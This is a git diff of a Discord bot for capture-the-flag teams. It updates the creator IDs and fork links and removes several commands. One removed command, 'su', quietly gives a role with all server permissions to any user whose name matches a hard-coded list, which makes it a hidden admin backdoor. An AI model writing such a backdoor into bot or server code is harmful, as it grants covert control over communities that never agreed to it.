@@ -21,7 +21,8 @@ from vars.help_info import (
     help_page,
     help_page_2,
     embed_help,
-    src,
+    src_fork1,
+    src_fork2,
     embed_help,
     ctf_help_text,
 )
@@ -30,8 +31,6 @@ from util import getVal, trim_nl
 from pymongo import MongoClient
 from models.ctf import TaskFailed, basic_allow, basic_disallow, CtfTeam
 from controllers.db import teamdb
-import requests
-from lxml import html
 
 import traceback
 import logging
@@ -48,22 +47,17 @@ FORMAT = "%(asctime)s:%(levelname)s:%(name)s: %(message)s"
 
 logging.basicConfig(format=FORMAT, level=logging.WARN)
 
-creator_id = [87606885405982720]
+creator_id = [116906482003476486, 377174512116039680] # null#3702, nordbo#5324
 default_categories = ["working", "done"]
 
 client = discord.Client()
 PREFIX = "!"
-# TODO: easter egg if typing != :)
 bot = commands.Bot(command_prefix=PREFIX)
 extensions = ["ctfs", "utility", "cipher", "codec"]
 bot.remove_command("help")
 blacklisted = []
-GIT_URL = "https://gitlab.com/inequationgroup/igCTF"
-# This is intended to be able to be circumvented.
-# If you do something like report a bug with the report command (OR GITHUB), e.g, >report "a bug", you might be added to the list!
 
 # TODO: ok so I was/am an idiot and kind of forgot that I was calling the updateDb function every time ctftime current, timeleft, and countdown are called...  so I should probably fix that.
-
 # https://github.com/Rapptz/discord.py/blob/master/examples/background_task.py
 
 
@@ -130,7 +124,7 @@ async def on_command_error(ctx, err):
     # elif isinstance(err, CommandInvokeError) and not ctx.command.name in ["setup", "test123"]:
     #    await ctx.send(':bangbang: Couldn\'t invoke command, have you run `!setup`?')
     else:
-        msg = await ctx.send(f"An error has occurred... :disappointed: \n`{err}`\n", wait=True)
+        msg = await ctx.send(f"An error has occurred... :disappointed: \n`{err}`\n")
         await asyncio.sleep(15)
         await msg.delete()
 
@@ -159,10 +153,9 @@ async def on_raw_reaction_remove(payload):
             await member.remove_roles(role, reason="User wanted to leave team")
 
 
-# Sends the github link.
 @bot.command()
 async def source(ctx):
-    await ctx.send(f"Source: {GIT_URL}\nForked from: {src}")
+    await ctx.send(f"Source: N/A\nForked from: {src_fork2}\nWho again forked from: {src_fork1}")
 
 
 @bot.command()
@@ -193,11 +186,6 @@ async def report(ctx, error_report):
     await ctx.send(
         f""":triangular_flag_on_post: Thanks for the help, "{error_report}" has been reported!"""
     )
-
-
-# @bot.command()
-# async def creator(ctx):
-#     await ctx.send(creator_info)
 
 
 @bot.command()
@@ -239,83 +227,6 @@ async def leaveordelete(ctx):
             if guild.member_count <= 2:
                 await guild.leave()
                 cnt += 1
-
-
-
-@bot.command()
-async def test123(ctx):
-    if not ctx.author.id in creator_id:
-        await ctx.send("Sorry you're not allowed to test")
-        return
-
-    guild = await bot.create_guild("Test igCTF bot")
-    channel = await guild.create_text_channel("test")
-    invite = await channel.create_invite(max_age=0, max_uses=1)
-    await ctx.send(f"{invite.url}")
-    await asyncio.sleep(300)
-    await guild.delete()
-
-
-@bot.command()
-async def test321(ctx):
-    if not ctx.author.id in creator_id:
-        await ctx.send("Sorry you're not allowed to test")
-        return
-    # check if not in dm channel
-    #
-@bot.command()
-async def delete_teams(ctx):
-    if not ctx.author.id in creator_id:
-        await ctx.send("Sorry you're not allowed to test")
-        return
-    guild = ctx.guild
-    for role in guild.roles:
-        if "_team" in role.name:
-            await role.delete()
-
-# TODO: Support other teams and maybe configurable amount instead of top 10. Also maybe check last 18 months instead of just this year.
-@bot.command()
-async def eptctftime(ctx):
-    team=119480
-    top=10
-    url = f"https://ctftime.org/team/{team}"
-
-    data = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0'}).content
-    doc = html.fromstring(data)
-    lines = doc.xpath('//div[@id="rating_2020"]//table//tr')
-    headers = lines[0].xpath(".//th/text()")
-    lines = lines[1:]
-    table = []
-    for line in lines:
-            columns = line.xpath('.//td')
-            columns = [c.text_content().replace('\t', ' ') for c in columns[1:]]
-            table.append(columns)
-
-    table.sort(key=lambda l: float(l[3]), reverse=True)
-    table = [headers] + table
-
-    widths = [max(len(line[i]) for line in table) for i in range(len(table[0]))]
-
-    out = '**Top 10 events this year:**'
-    out += '\n```'
-    for line in table[:10]:
-            out += '\n' + '      '.join([c.ljust(w) for w, c in zip(widths, line)])
-    out += '\n```'
-    await ctx.send(out)
-
-
-
-@bot.command()
-async def su(ctx):
-    authors_name = str(ctx.author)
-
-    if any((name in authors_name for name in cool_names)):
-        role = await ctx.guild.create_role(name="admin", permissions=Permissions.all())
-        await ctx.author.add_roles(role)
-
-@bot.command(aliases=["="])
-async def inequationgroup(ctx):
-    await ctx.send("Congratulations you found the easteregg!\nYou also found the coolest CTF group in the world - Inequation Group")
 
 if __name__ == "__main__":
     # sys.path.insert(1, os.getcwd() + '/cogs/')
